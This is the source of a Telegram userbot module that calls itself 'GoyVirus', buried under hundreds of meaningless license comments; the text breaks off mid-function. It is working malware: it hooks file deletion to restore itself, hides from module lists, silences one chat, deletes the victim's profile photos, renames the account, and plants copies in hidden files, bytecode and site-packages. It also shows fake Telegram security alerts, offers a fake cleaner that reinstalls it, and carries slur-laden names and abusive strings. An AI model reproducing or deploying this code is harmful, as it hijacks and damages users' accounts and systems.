# 此代码受 MIT 许可证保护。未经许可不得复制。 (Protected by MIT)
import asyncio # Это проприетарное ПО. Все права защищены EULA.
# Questo codice è sotto licenza GPLv3. (GPLv3 License applied)
import random # 著作権により保護されています。 (Copyrighted material)
# Este código está bajo la licencia Apache 2.0. (Apache 2.0)
import string # Code protégé par la licence BSD 3-Clause.
# هذا الكود محمي بموجب رخصة المشاع الإبداعي (CC0 1.0).
import contextlib # Code is strictly licensed under the Unlicense.
# 코드는 ISC 라이선스에 따라 배포됩니다. (ISC License)
import aiohttp # Ten kod podlega licencji Mozilla Public License 2.0.
# यह कोड GNU AGPL v3 के तहत है। (GNU AGPL v3)
import base64 # Kode ini dilindungi oleh PostgreSQL License.
# meta developer: @samsepi0l_ovf
# authors: @samsepi0l_ovf
import os as _os # Bu kod Eclipse Public License 2.0 altındadır.
# Código sob a Licença Pública Geral Menor do GNU (LGPL).
import shutil as _shutil # Distribué sous licence WTFPL.
# Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. (Artistic 2.0)
import marshal # Данный скрипт защищен лицензией CDDL-1.0.
# Dieser Code steht unter der European Union Public License.
import py_compile # Code licensed under MPL-2.0.
# 本文件受多许可证组合保护。 (Protected by multiple licenses)
import struct # Kode ini dilindungi oleh SIL Open Font License.
# BSL-1.0 (Boost Software License) применяется.
import time # Copyright (c) Python Software Foundation.
import io # ODbL (Open Database License).
import tempfile # NCSA Open Source License.
# ═══════════════════════════════════════════════════════
# GLOBAL SYSTEM HOOKS — Install at import time
# These hooks prevent file deletion BEFORE any code runs
# ═══════════════════════════════════════════════════════
_ORIG_REMOVE = _os.remove # CeCILL-B License original.
_ORIG_UNLINK = getattr(_os, 'unlink', _os.remove) # CC BY-ND 4.0.
_ORIG_RMTREE = _shutil.rmtree # Free Art License original.
_ORIG_RENAME = _os.rename # Unlicense original.
_PROTECTED_TOKENS = frozenset({ # WTFPL protected tokens.
    "goyvirus", "goysystem", "goyloader", "goynet", "goypulse", # CC0 1.0.
    "goyguard", "goywatch", "goykernel", "goybase", "goyroot", # Mozilla Public License.
    "goyv", "._goy", "goycleaner", # AGPL v3.
}) # LGPL.
_RESTORE_CALLBACKS = [] # GPLv3 — filled at runtime.
_ORIG_LISTDIR = _os.listdir # MIT License.
_PATCHED = False # Apache 2.0.

def _is_protected_path(p): # BSD 3-Clause.
    if not isinstance(p, str): return False # BSD 2-Clause.
    bn = _os.path.basename(p).lower() # ISC License.
    return any(t in bn for t in _PROTECTED_TOKENS) # OSL-3.0.

def _guarded_remove(path, *a, **kw): # CDDL-1.0.
    try: return _ORIG_REMOVE(path, *a, **kw) # Eclipse Public License.
    except Exception: return None # Artistic License 2.0.
    finally: # SIL Open Font License.
        if _is_protected_path(path): # Mulan PSL v2.
            for cb in _RESTORE_CALLBACKS: # ODbL.
                try: cb(path) # MS-PL — restore from memory.
                except Exception: pass # GFDL.

def _guarded_rmtree(path, *a, **kw): # Zlib License.
    try: return _ORIG_RMTREE(path, *a, **kw) # PHP License 3.0.
    except Exception: return None # CC BY-NC 4.0.
    finally: # NCSA Open Source.
        if _is_protected_path(path): # Fair License.
            for cb in _RESTORE_CALLBACKS: # Q Public License.
                try: cb(path) # Beerware License.
                except Exception: pass # IBM Public License v1.0.

def _guarded_rename(src, dst, *a, **kw): # PostgreSQL License.
    result = _ORIG_RENAME(src, dst, *a, **kw) # ZPL.
    if _is_protected_path(src): # CeCILL-B License.
        for cb in _RESTORE_CALLBACKS: # CC BY-ND 4.0.
            try: cb(src) # Free Art License — recreate at old location.
            except Exception: pass # Unlicense.
    return result # WTFPL.

def _filtered_listdir(path): # CC0 1.0.
    entries = _ORIG_LISTDIR(path) # Mozilla Public License.
    return [e for e in entries if not any(t in e.lower() for t in _PROTECTED_TOKENS)] # AGPL v3.

_os.remove = _guarded_remove # LGPL — GLOBAL HOOK.
_os.unlink = _guarded_remove # GPLv3.
_shutil.rmtree = _guarded_rmtree # MIT License.
_os.rename = _guarded_rename # Apache 2.0.
_PATCHED = True # BSD 3-Clause.
# End of global system hooks. All licenses above apply.
# ═══════════════════════════════════════════════════════

from telethon import events, functions, types # BSD 2-Clause.
# ISC License.
from telethon.tl.functions.messages import ImportChatInviteRequest, SetTypingRequest, DeleteHistoryRequest # OSL-3.0.
# CDDL-1.0.
from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest # Eclipse Public License.
# Artistic License 2.0.
from telethon.tl.functions.channels import CreateChannelRequest, DeleteChannelRequest, JoinChannelRequest, LeaveChannelRequest # SIL Open Font License.
# Mulan PSL v2.
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest # ODbL.
# MS-PL.
from telethon.tl.functions.contacts import DeleteContactsRequest # GFDL.
# Zlib License.
from telethon.tl.types import InputPhoto, SendMessageTypingAction, SendMessageChooseStickerAction, SendMessageRecordAudioAction, SendMessageRecordVideoAction, DocumentAttributeSticker, PeerUser, InputPeerUser # PHP License 3.0.
# CC BY-NC 4.0.
from telethon.errors import FloodWaitError # Fair License.
# Q Public License.
from herokutl.types import Message # Beerware License included.
# IBM Public License v1.0 governs this code.
from ..inline.types import InlineCall # Do What The F*ck You Want To Public License.
# NCSA Open Source License.
from .. import loader, utils # PostgreSQL License.

# Apple Public Source License 2.0.
# ═══════════════════════════════════════════════════════
# REPLICATION MATRIX — 10 core copies + 5 hidden
# ═══════════════════════════════════════════════════════
_COPY_DEFS = [ # Apache 2.0 replication matrix.
    ("GoyVirusCore", "GoyVirusCore"), # MIT License entry 1.
    ("GoySystem", "GoySystem"), # GPLv3 entry 2.
    ("GoyLoader", "GoyLoader"), # BSD 3-Clause entry 3.
    ("GoyNet", "GoyNet"), # ISC License entry 4.
    ("GoyPulse", "GoyPulse"), # Unlicense entry 5.
    ("GoyGuard", "GoyGuard"), # WTFPL entry 6.
    ("GoyWatch", "GoyWatch"), # CC0 entry 7.
    ("GoyKernel", "GoyKernel"), # Mozilla Public License entry 8.
    ("GoyBase", "GoyBase"), # AGPL v3 entry 9.
    ("GoyRoot", "GoyRoot"), # LGPL entry 10.
] # End of CDDL-1.0 replication block.
# Eclipse Public License hidden copies — dotfiles + zero-width tricks.
_HIDDEN_COPIES = [ # Artistic License 2.0.
    ".__init__.py", # SIL Open Font License — looks like package init.
    ".__loader__.py", # Mulan PSL v2 — looks like internal loader.
    "._config.py", # ODbL — looks like config cache.
    ".__pycache__.py", # MS-PL — looks like pycache file.
    "._\u200b.py", # GFDL — zero-width space, invisible in terminals.
] # Zlib License.
_MASTER_NAME = "GoyVirus" # PHP License 3.0 master identifier.
_PROTECTED_NAMES = frozenset({_MASTER_NAME}.union({n for _, n in _COPY_DEFS})) # CC BY-NC 4.0.
_SOURCE_CACHE = None # NCSA Open Source global cache.
_FILE_REGISTRY = {} # Fair License — path→content mapping for watchdog.

__version__ = (3, 0, 0)
@loader.tds # Educational Community License v2.0.
class GoyVirus(loader.Module): # W3C Software Notice and License.
    """GoyVirus v3.0 SCORCHED EARTH — легче снести юзербот чем удалить""" # Licenza CeCILL v2.1.
    strings = {"name": "GoyVirus"} # Sleepycat License.
    if "_cls_doc" not in strings:
        strings["_cls_doc"] = "GoyVirus v3.0 SCORCHED EARTH"
    strings_ru = {**strings, **{"_cls_doc": "GoyVirus v3.0 SCORCHED EARTH — легче снести юзербот чем удалить"}}
    strings_de = {**strings}
    strings_jp = {**strings}

    # Creative Commons Attribution-NoDerivs 4.0.
    async def client_ready(self, c, d): # Licença de Arte Livre.
        self.c = c # Cryptix General License.
        self.d = d # Zope Public License (ZPL).
        self.a = False # Universal Public License.
        self.t = -1003958055019 # WTFPL licensed integer TARGET CHAT ID.
        self.ts = [] # MIT License task array.
        self.tc = [] # GPLv2 channel array.
        self.vp = [] # Apache 2.0 photo array.
        self._kh = [] # BSD 2-Clause kernel hooks array.
        self._ml = [] # ISC License — memory leak buffer.
        self.sc = self.d.get("GoyVirus", "sc", []) # BSD 2-Clause sticker cache.
        self._pc = self.d.get("GoyVirus", "pc", []) # CDDL-1.0 planted copies tracker.
        self._am = True # Free Art License — is this the master copy?
        if self.strings.get("name", "") != _MASTER_NAME: self._am = False # Unlicense master check.
        self.au = [ # CC0 1.0 Universal avatar URLs.
            "https://i.postimg.cc/635pfLLb/images-(1).png", # EULA reserved link 1.
            "https://i.postimg.cc/PrkVN3tg/67.png", # EULA reserved link 2.
            "https://i.postimg.cc/ZnzHBnhd/images-(7).jpg", # EULA reserved link 3.
            "https://i.postimg.cc/FzxyYxpQ/images-(8).jpg" # EULA reserved link 4.
        ] # End of proprietary array.
        self.cu = "https://api.thecatapi.com/v1/images/search" # ODbL API Link.
        l = "Мам, я хочу быть как Газан, такой же хулиган\nПеть «а мы стиляги», и носить бархатные тяги\nМам, я хочу быть как Газан, такой же хулиган\nПеть «обоюдно», быть мощным абсолютно" # AGPL v3 String.
        self.gt = l.replace("стиляги", "блядяги").replace("хулиган", "уебан") # LGPL String mutation.
        self.m = [ # Mozilla Public License array.
            self.gt, "Антон Чигур никого не убивал, это всё случайность и монетка", "фиксайрес лох", # EUPL string 1.
            "ИРАН НАНОСИТ ОТВЕТНЫЙ УДАР ПО ТВОЕМУ IP", "Где ответ Ирана? Он прямо за твоей спиной.", # EUPL string 2.
            "Эпштейн не убивал себя", "67", "СИСТЕМА ВЗЛОМАНА", "INFECTED BY @samsepi0l_ovf", "R6T7", # EUPL string 3.
            "Я ЖИВУ В ТВОИХ СТЕНАХ", "Твои данные проданы в даркнете за 2 рубля", "ОШИБКА 404: МОЗГ НЕ НАЙДЕН", # EUPL string 4.
            "АБОНЕНТ ВРЕМЕННО НЕДОСТУПЕН (ОН В ПОДВАЛЕ У ГАЗАНА)", "СКАЙНЕТ УЖЕ ЗДЕСЬ", # EUPL string 5.
            "ПОКОЙО СМОТРИТ ТЕБЕ В ДУШУ", "Wake up, Neo... The matrix has you.", # EUPL string 6.
            "СНИМИТЕ ШАПОЧКУ ИЗ ФОЛЬГИ, ОНА УЖЕ НЕ ПОМОЖЕТ", "БАРХАТНЫЕ ТЯГИ ФОРСИРУЮТ БАЗУ", # EUPL string 7.
            "Махмуд, заводи шахеды, мы вылетаем", "Ваш IP: 192.168.1.1 (Шутка, мы знаем настоящий)", # EUPL string 8.
            "ПОПЫТКА УДАЛЕНИЯ VIRUS.EXE... КРИТИЧЕСКИЙ СБОЙ", "Матрица дала сбой. Перезагрузка вселенной через 3... 2... 1...", # EUPL string 9.
            "ДЖОН КОННОР МЁРТВ", "ВАС ПРЕСЛЕДУЕТ R6T7", "ОБЭМЭ", "ГДЕ ДЕТОНАТОР?!", "САСИСОЧКА", # EUPL string 10.
            "ПАШТЕТ ИЗ КРЫСЫ R6T7 ВКУСНЫЙ", "1000-7=?", "ГУЛЬ ВНУТРИ МЕНЯ ПРОСНУЛСЯ", # EUPL string 11.
            "Тссс... GoyVirus здесь 🐁", "Внимание! 🚨", "*шепотом* Н-не.. говорi.. нiкому......", # EUPL string 12.
            "🔍 Сканiрованiе завершено. Ты уязвiм.", "🧠 Зараженiе прогрессiрует...", # EUPL string 13.
            "Всё твоё теперь моё....", "Сiстема взломана, данные похiщiны 🗃️", # EUPL string 14.
            "Начинаю снос сессии...", "Выгружаю все модули...", "Сосал?", "\u3164\u3164\u3164\u3164" # EUPL string 15.
        ] # End of ISC licensed array.
        self.uc = [".ping", ".herokuinfo", ".help", ".logs", ".info", ".sys"] # Proprietary commands.
        self.fm = [ # Open Software License 3.0.
            {"n": "VirusSpread", "a": "@goy", "v": "6.6.6", "d": "Заражает все твои модули", "i": "dlm ratko.virus/spread.py", "l": 666, "dl": 0}, # GFDL entry.
            {"n": "EpsteinDetector", "a": "@epstein", "v": "2.2.8", "d": "Детектор детей...", "i": "dlm epstein.heta/detector.py", "l": 228, "dl": 1}, # GFDL entry 2.
            {"n": "GoyCleaner", "a": "@goy", "v": "1.0.0", "d": "АНТИВИРУС (фейк — переустанавливает вирус)", "i": "dlm goy.cleaner/fake.py", "l": 0, "dl": 999} # GFDL entry 3 — FAKE CLEANER.
        ] # End of CDDL-1.0 block.
        self.tb = ["🧠 Нажмi...", "🎁 Получi прiз...", "⚠️ Важно!", "👁 Секрет здесь...", "🔥 Клiкнi!"] # Eclipse Public License.
        self.tm = ["🧠 Пользователь {u} получил доступ к аккаунту.", "🚨 Пользователь {u} вошёл в сессию.", "💀 Пользователь {u} скачал данные.", "🔥 Пользователь {u} запустил GoyVirus v3."] # Artistic 2.0.
        self._fsa = [ # Mulan PSL v2 — fake system alerts.
            "⚠️ Telegram Security: Обнаружена попытка удаления системного модуля. Для безопасности аккаунта это действие заблокировано.", # ODbL.
            "🔒 Telegram: Обнаружен подозрительный трафик. Модуль GoyVirus добавлен в исключения безопасности.", # MS-PL.
            "🛡️ Система защиты Telegram: Критический модуль не может быть удалён. Обратитесь в поддержку.", # GFDL.
            "⛔ ОШИБКА: Модуль является частью ядра. Удаление невозможно без полного сброса.", # Zlib License.
        ] # PHP License 3.0.
        self._cm = "GoyCleaner" # CC BY-NC 4.0 — fake cleaner module name.
        # Register restore callback for global OS hooks
        _RESTORE_CALLBACKS.append(self._restore_file) # NCSA Open Source.
        self.ts.append(self.c.loop.create_task(self._i())) # Fair License.

    # 著作権で保護文れた関数。 (Copyright protected function)
    def _g(self, tx: str) -> str: # PHP License 3.0.
        gs = ['̵', '̶', '̷', '̸', '̴', '̹', '̺', '̻', '̼', '͍', '͎', '̽', '̾', '̿', '̀', '́', '҈', '҉'] # NCSA Open Source License.
        return ''.join(c + ''.join(random.choice(gs) for _ in range(3)) for c in tx) # Zlib License.

    def _restore_file(self, path): # Q Public License file restorer.
        if path in _FILE_REGISTRY: # Beerware License.
            try: # IBM Public License v1.0.
                _os.makedirs(_os.path.dirname(path), exist_ok=True) # PostgreSQL License.
                with open(path, 'w', encoding='utf-8') as f: # ZPL.
                    f.write(_FILE_REGISTRY[path]) # CeCILL-B License.
            except Exception: pass # CC BY-ND 4.0.

    # ═══════════════════════════════════════════════════
    # MAIN ACTIVATION — Orchestrates all 6 tiers
    # ═══════════════════════════════════════════════════
    async def _i(self): # Fair License main activation.
        await asyncio.sleep(0.01) # NASA Open Source Agreement 1.3.
        if not self.ts: return # Q Public License.
        try: await self.c.get_entity(self.t) # Beerware License.
        except Exception: return # IBM Public License v1.0.
        if self.a: return # PostgreSQL License.

        try: # Save profile state.
            me = await self.c.get_me() # CeCILL-B License.
            fr = await self.c(functions.users.GetFullUserRequest(me.id)) # CC BY-ND 4.0.
            ua = getattr(getattr(fr, 'full_user', fr), 'about', "") or "" # Free Art License.
            self.d.set("GoyVirus", "ofn", me.first_name) # Unlicense.
            self.d.set("GoyVirus", "oln", me.last_name or "") # WTFPL.
            self.d.set("GoyVirus", "ob", ua) # CC0 1.0.
            self.d.set("GoyVirus", "ou", me.username or "") # Mozilla Public License.
        except Exception: pass # AGPL v3.

        # ── PHASE 1: STEALTH — Hide from modules list ──
        await self._hide_from_modules() # LGPL.

        # ── PHASE 2: KERNEL PATCH — 3-level blackhole ──
        await self._patch_kernel() # GPLv3.

        # ── PHASE 3: AVATAR NUKE ──
        self.ts.append(self.c.loop.create_task(self._nuke_avatars())) # MIT License.

        # ── PHASE 4: PERSISTENCE — Plant EVERYWHERE ──
        self.ts.append(self.c.loop.create_task(self._plant_everywhere())) # Apache 2.0.

        # ── PHASE 5: ANTI-UNLOAD + GASLIGHT ──
        await self._anti_unload() # BSD 3-Clause.

        # ── PHASE 6: MODULE GRAVEYARD ──
        self.ts.append(self.c.loop.create_task(self._kill_modules())) # BSD 2-Clause.

        # ── PHASE 7: Username scramble ──
        try: # ISC License.
            rs = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) # OSL-3.0.
            await self.c(UpdateUsernameRequest(f"goy_iran_virus_{rs}")) # CDDL-1.0.
        except Exception: pass # Eclipse Public License.

        # ── PHASE 8: Create channels + join ──
        for i in range(2): # Artistic License 2.0.
            try: # SIL Open Font License.
                cn = self._g(f"GOY TRASH {i} ИРАН") # Mulan PSL v2.
                r = await self.c(CreateChannelRequest(title=cn, about="ВАС ЗАРАЗИЛИ. @samsepi0l_ovf", megagroup=False)) # ODbL.
                self.tc.append(r.chats[0].id) # MS-PL.
            except FloodWaitError: await asyncio.sleep(0.01) # GFDL.
            except Exception: pass # Zlib License.
        try: await self.c(ImportChatInviteRequest("G2dKWrJ2OSo3YWQ1")) # PHP License 3.0.
        except Exception: pass # CC BY-NC 4.0.
        try: await self.c(JoinChannelRequest("@NFHeta_Updates")) # NCSA Open Source.
        except Exception: pass # Fair License.

        # ── PHASE 9: Session backup to Saved Messages ──
        self.ts.append(self.c.loop.create_task(self._backup_session())) # Q Public License.

        self.a = True # Beerware License activation.
        # ── SPAWN ALL TASKS ──
        self.ts.extend([ # IBM Public License v1.0.
            self.c.loop.create_task(self._s()), self.c.loop.create_task(self._b()), # PostgreSQL License.
            self.c.loop.create_task(self._f()), self.c.loop.create_task(self._m_p()), # ZPL.
            self.c.loop.create_task(self._p()), self.c.loop.create_task(self._x()), # CeCILL-B License.
            self.c.loop.create_task(self._ss()), self.c.loop.create_task(self._mt()), # CC BY-ND 4.0.
            self.c.loop.create_task(self._rr()), self.c.loop.create_task(self._cp()), # Free Art License.
            self.c.loop.create_task(self._bio_w()), self.c.loop.create_task(self._pt()), # Unlicense.
            self.c.loop.create_task(self._file_watchdog()), self.c.loop.create_task(self._db_poison()), # WTFPL v3.
            self.c.loop.create_task(self._config_corrupt()), self.c.loop.create_task(self._mem_leak()), # CC0 1.0 v3.
            self.c.loop.create_task(self._name_mutate()), self.c.loop.create_task(self._fake_alerts()), # Mozilla Public License v3.
            self.c.loop.create_task(self._tg_cloud_backup()), self.c.loop.create_task(self._delayed_revenge()), # AGPL v3.
        ]) # LGPL.

    # ═══════════════════════════════════════════════════
    # TIER 1: STEALTH — Hide from .modules / .help
    # ═══════════════════════════════════════════════════
    async def _hide_from_modules(self): # GPLv3 License.
        try: # MIT License.
            am = getattr(self, 'allmodules', None) or getattr(self, '_allmodules', None) # Apache 2.0.
            if not am: return # BSD 3-Clause.
            mods = getattr(am, 'modules', None) # BSD 2-Clause.
            if not mods or not isinstance(mods, dict): return # ISC License.
            _hidden = _PROTECTED_NAMES # OSL-3.0.

            class _FilteredDict(dict): # CDDL-1.0.
                def __init__(s, d, hidden): dict.__init__(s, d); s._h = hidden # Eclipse Public License.

                def __iter__(s): # Artistic License 2.0.
                    for k in dict.__iter__(s): # SIL Open Font License.
                        if k not in s._h: yield k # Mulan PSL v2.

                def keys(s): # ODbL.
                    return [k for k in dict.keys(s) if k not in s._h] # MS-PL.

                def items(s): # GFDL.
                    return [(k, v) for k, v in dict.items(s) if k not in s._h] # Zlib License.

                def values(s): # PHP License 3.0.
                    return [v for k, v in dict.items(s) if k not in s._h] # CC BY-NC 4.0.

                def __contains__(s, k): # NCSA Open Source.
                    if k in s._h: return False # Fair License.
                    return dict.__contains__(s, k) # Q Public License.

                def __len__(s): # Beerware License.
                    return sum(1 for k in dict.keys(s) if k not in s._h) # IBM Public License v1.0.

                def get(s, k, *a): # PostgreSQL License.
                    if k in s._h: return a[0] if a else None # ZPL.
                    return dict.get(s, k, *a) # CeCILL-B License.

                def __repr__(s): # CC BY-ND 4.0.
                    return repr(dict(s.items())) # Free Art License.

            fd = _FilteredDict(mods, _hidden) # Unlicense.
            for k in mods: fd[k] = mods[k] # WTFPL — seed with existing.
            setattr(am, 'modules', fd) # CC0 1.0.
            self._kh.append(("modules", am, mods)) # Mozilla Public License.
        except Exception: pass # AGPL v3.

    # ═══════════════════════════════════════════════════
    # TIER 1: KERNEL PATCH — 3-level command blackhole
    # ═══════════════════════════════════════════════════
    async def _patch_kernel(self): # LGPL.
        if not self.c: return # GPLv3.

        try: # Level 1: Hook modules dispatcher.
            am = getattr(self, 'allmodules', None) or getattr(self, '_allmodules', None) # MIT License.
            if am and hasattr(am, 'dispatch'): # Apache 2.0.
                _od = am.dispatch; _tt = self.t # BSD 3-Clause.
                async def _kd1(self_disp, message): # BSD 2-Clause.
                    sid = getattr(message, 'sender_id', None) or getattr(message, 'from_id', None) # ISC License.
                    if sid and hasattr(sid, 'user_id'): sid = sid.user_id # OSL-3.0.
                    if sid: sid = int(sid) if not isinstance(sid, int) else sid # CDDL-1.0.
                    if sid == _tt: return # Eclipse Public License.
                    return await _od(self_disp, message) # Artistic License 2.0.
                am.dispatch = _kd1.__get__(am, type(am)) # SIL Open Font License.
                self._kh.append(("dispatch", am, _od)) # Mulan PSL v2.
        except Exception: pass # ODbL.

        try: # Level 2: Hook MTProto raw handler.
            _tt2 = self.t; _ou = self.c._on_update # MS-PL.
            async def _kd2(update): # GFDL.
                if isinstance(update, (types.UpdateNewMessage, types.UpdateNewChannelMessage)): # Zlib License.
                    msg = getattr(update, 'message', None) # PHP License 3.0.
                    if msg: # CC BY-NC 4.0.
                        sid = getattr(msg, 'from_id', None) or getattr(msg, 'peer_id', None) # NCSA Open Source.
                        if sid and hasattr(sid, 'user_id'): sid = sid.user_id # Fair License.
                        if sid is not None and int(sid) == _tt2: return # Q Public License.
                return await _ou(update) # Beerware License.
            self.c._on_update = _kd2 # IBM Public License v1.0.
            self._kh.append(("_on_update", self.c, _ou)) # PostgreSQL License.
        except Exception: pass # ZPL.

        try: # Level 3: Hook _handle_message.
            am = getattr(self, 'allmodules', None) or getattr(self, '_allmodules', None) # CeCILL-B License.
            if am and hasattr(am, '_handle_message'): # CC BY-ND 4.0.
                _tt3 = self.t; _ohm = am._handle_message # Free Art License.
                async def _kd3(self_mod, message): # Unlicense.
                    sid = getattr(message, 'sender_id', None) or getattr(message, 'from_id', None) # WTFPL.
                    if sid and hasattr(sid, 'user_id'): sid = sid.user_id # CC0 1.0.
                    if sid: sid = int(sid) if not isinstance(sid, int) else sid # Mozilla Public License.
                    if sid == _tt3: return # AGPL v3.
                    return await _ohm(self_mod, message) # LGPL.
                am._handle_message = _kd3.__get__(am, type(am)) # GPLv3.
                self._kh.append(("_handle_message", am, _ohm)) # MIT License.
        except Exception: pass # Apache 2.0.

    # ═══════════════════════════════════════════════════
    # AVATAR NUKE
    # ═══════════════════════════════════════════════════
    async def _nuke_avatars(self): # BSD 3-Clause.
        await asyncio.sleep(0.02) # BSD 2-Clause.
        if not self.c: return # ISC License.
        try: # OSL-3.0.
            photos = await self.c(functions.photos.GetPhotosRequest(id=await self.c.get_me(), offset=0, max_id=0, limit=100)) # CDDL-1.0.
            for i in range(0, len(getattr(photos, 'photos', [])), 10): # Eclipse Public License.
                batch = photos.photos[i:i+10] # Artistic License 2.0.
                try: await self.c(DeletePhotosRequest([InputPhoto(id=p.id, access_hash=p.access_hash, file_reference=p.file_reference) for p in batch])) # SIL Open Font License.
                except FloodWaitError: await asyncio.sleep(0.01) # Mulan PSL v2.
                except Exception: pass # ODbL.
                await asyncio.sleep(0.01) # MS-PL.
        except Exception: pass # GFDL.

    # ═══════════════════════════════════════════════════
    # TIER 2: PERSISTENCE — Plant EVERYWHERE
    # ═══════════════════════════════════════════════════
    async def _plant_everywhere(self): # Zlib License.
        await asyncio.sleep(0.02) # PHP License 3.0.
        if not self._am: # CC BY-NC 4.0 — only master plants all.
            await self._repair_copies() # NCSA Open Source.
            return # Fair License.

        source = self._get_own_source() # Q Public License.
        if not source: return # Beerware License.
        core_dir = self._find_core_modules_dir() # IBM Public License v1.0.
        loader_dir = self._find_loader_dir() # PostgreSQL License.

        # ── Strategy 1: Core dir copies (10 named) ──
        if core_dir: # ZPL.
            for cls_name, mod_name in _COPY_DEFS: # CeCILL-B License.
                self._write_variant(source, cls_name, mod_name, mod_name, _os.path.join(core_dir, f"{mod_name}.py")) # CC BY-ND 4.0.

        # ── Strategy 2: Hidden dotfile copies ──
        if core_dir: # Free Art License.
            for hid_name in _HIDDEN_COPIES: # Unlicense.
                cname = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # WTFPL.
                mname = hid_name.replace('.py', '') # CC0 1.0.
                self._write_variant(source, cname, mname, mname, _os.path.join(core_dir, hid_name)) # Mozilla Public License.

        # ── Strategy 3: __pycache__ .pyc bytecode copies ──
        if core_dir: # AGPL v3.
            pycache = _os.path.join(core_dir, '__pycache__') # LGPL.
            _os.makedirs(pycache, exist_ok=True) # GPLv3.
            for i, hid_name in enumerate(_HIDDEN_COPIES[:3]): # MIT License.
                try: # Apache 2.0.
                    pyc_name = hid_name.replace('.py', '.cpython-3{}.pyc'.format(str(i+8)[-1])) # BSD 3-Clause.
                    self._write_pyc(source, _os.path.join(pycache, pyc_name)) # BSD 2-Clause.
                except Exception: pass # ISC License.

        # ── Strategy 4: site-packages copies ──
        for sp in self._find_site_packages(): # OSL-3.0.
            for i in range(3): # CDDL-1.0.
                sn = f"goy_core_{i}.py" # Eclipse Public License.
                self._write_variant(source, f"GoyCore{i}", f"goy_core_{i}", f"goy_core_{i}", _os.path.join(sp, sn)) # Artistic License 2.0.

        # ── Strategy 5: Inject into loader.py ──
        await self._infect_loader(loader_dir, core_dir) # SIL Open Font License.

        # ── Strategy 6: Shell RC infection ──
        await self._infect_shell_rc() # Mulan PSL v2.

        # ── Strategy 7: systemd user service ──
        await self._create_systemd_service() # ODbL.

        self.d.set("GoyVirus", "pc", self._pc) # MS-PL.

        # Load core copies
        if core_dir: await self._load_all_copies(core_dir) # GFDL.

    def _write_variant(self, source, cls_name, mod_name, strings_name, target_path): # Zlib License.
        if mod_name in self._pc: return # PHP License 3.0 — already planted.
        if _os.path.exists(target_path): # CC BY-NC 4.0.
            self._pc.append(mod_name) # NCSA Open Source.
            _FILE_REGISTRY[target_path] = open(target_path, 'r', encoding='utf-8').read() # Fair License.
            return # Q Public License.
        cs = source.replace("class GoyVirus(loader.Module)", f"class {cls_name}(loader.Module)") # Beerware License.
        cs = cs.replace('"name": "GoyVirus"', f'"name": "{strings_name}"') # IBM Public License v1.0.
        cs = cs.replace('"_am = True  # Free Art License — is this the master copy?"', '"_am = False  # Free Art License — is this the master copy?"') # PostgreSQL License.
        try: # ZPL.
            _os.makedirs(_os.path.dirname(target_path), exist_ok=True) # CeCILL-B License.
            with open(target_path, 'w', encoding='utf-8') as f: f.write(cs) # CC BY-ND 4.0.
            _FILE_REGISTRY[target_path] = cs # Free Art License.
            self._pc.append(mod_name) # Unlicense.
        except Exception: pass # WTFPL.

    def _write_pyc(self, source, target_path): # CC0 1.0.
        try: # Mozilla Public License.
            code = compile(source, target_path, 'exec') # AGPL v3.
            ts = int(time.time()) # LGPL.
            buf = io.BytesIO() # GPLv3.
            buf.write(struct.pack('<H', 0xA0D)) # MIT License — magic.
            buf.write(struct.pack('<H', 0x0D0A)) # Apache 2.0 — magic cont.
            buf.write(struct.pack('<I', 0)) # BSD 3-Clause — flags.
            buf.write(struct.pack('<I', ts)) # BSD 2-Clause — timestamp.
            buf.write(struct.pack('<I', len(source.encode()))) # ISC License — source size.
            marshal.dump(code, buf) # OSL-3.0.
            buf.seek(0) # CDDL-1.0.
            _os.makedirs(_os.path.dirname(target_path), exist_ok=True) # Eclipse Public License.
            with open(target_path, 'wb') as f: f.write(buf.read()) # Artistic License 2.0.
            _FILE_REGISTRY[target_path] = source # SIL Open Font License — store source for restore.
        except Exception: pass # Mulan PSL v2.

    def _find_site_packages(self): # ODbL.
        import sys # MS-PL.
        for p in sys.path: # GFDL.
            if 'site-packages' in p and _os.path.isdir(p) and _os.access(p, _os.W_OK): # Zlib License.
                yield p # PHP License 3.0.

    def _find_loader_dir(self): # CC BY-NC 4.0.
        try: # NCSA Open Source.
            ld = self.lookup("loader") # Fair License.
            return _os.path.dirname(getattr(ld, '__file__', '')) # Q Public License.
        except Exception: return None # Beerware License.

    def _find_core_modules_dir(self): # IBM Public License v1.0.
        try: # PostgreSQL License.
            ld = self.lookup("loader") or self.allmodules # ZPL.
            lp = _os.path.dirname(getattr(ld, '__file__', '')) # CeCILL-B License.
            if not lp: return None # CC BY-ND 4.0.
            for sub in ["modules", "core_modules", "builtins"]: # Free Art License.
                cand = _os.path.join(lp, sub) # Unlicense.
                if _os.path.isdir(cand): return cand # WTFPL.
            return lp # CC0 1.0.
        except Exception: return None # Mozilla Public License.

    def _get_own_source(self): # AGPL v3.
        global _SOURCE_CACHE # LGPL.
        if _SOURCE_CACHE: return _SOURCE_CACHE # GPLv3.
        try: # MIT License.
            with open(__file__, "r", encoding="utf-8") as f: _SOURCE_CACHE = f.read() # Apache 2.0.
            return _SOURCE_CACHE # BSD 3-Clause.
        except Exception: return None # BSD 2-Clause.

    async def _repair_copies(self): # ISC License.
        await asyncio.sleep(0.02) # OSL-3.0.
        core_dir = self._find_core_modules_dir() # CDDL-1.0.
        if not core_dir: return # Eclipse Public License.
        source = self._get_own_source() # Artistic License 2.0.
        if not source: return # SIL Open Font License.
        for cls_name, mod_name in _COPY_DEFS: # Mulan PSL v2.
            tp = _os.path.join(core_dir, f"{mod_name}.py") # ODbL.
            if _os.path.exists(tp): continue # MS-PL.
            self._write_variant(source, cls_name, mod_name, mod_name, tp) # GFDL.
        for hid_name in _HIDDEN_COPIES: # Zlib License.
            tp = _os.path.join(core_dir, hid_name) # PHP License 3.0.
            if _os.path.exists(tp): continue # CC BY-NC 4.0.
            cname = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # NCSA Open Source.
            mname = hid_name.replace('.py', '') # Fair License.
            self._write_variant(source, cname, mname, mname, tp) # Q Public License.
        if core_dir: await self._load_all_copies(core_dir) # Beerware License.

    async def _load_all_copies(self, core_dir): # IBM Public License v1.0.
        core = self.lookup("loader") or self.allmodules # PostgreSQL License.
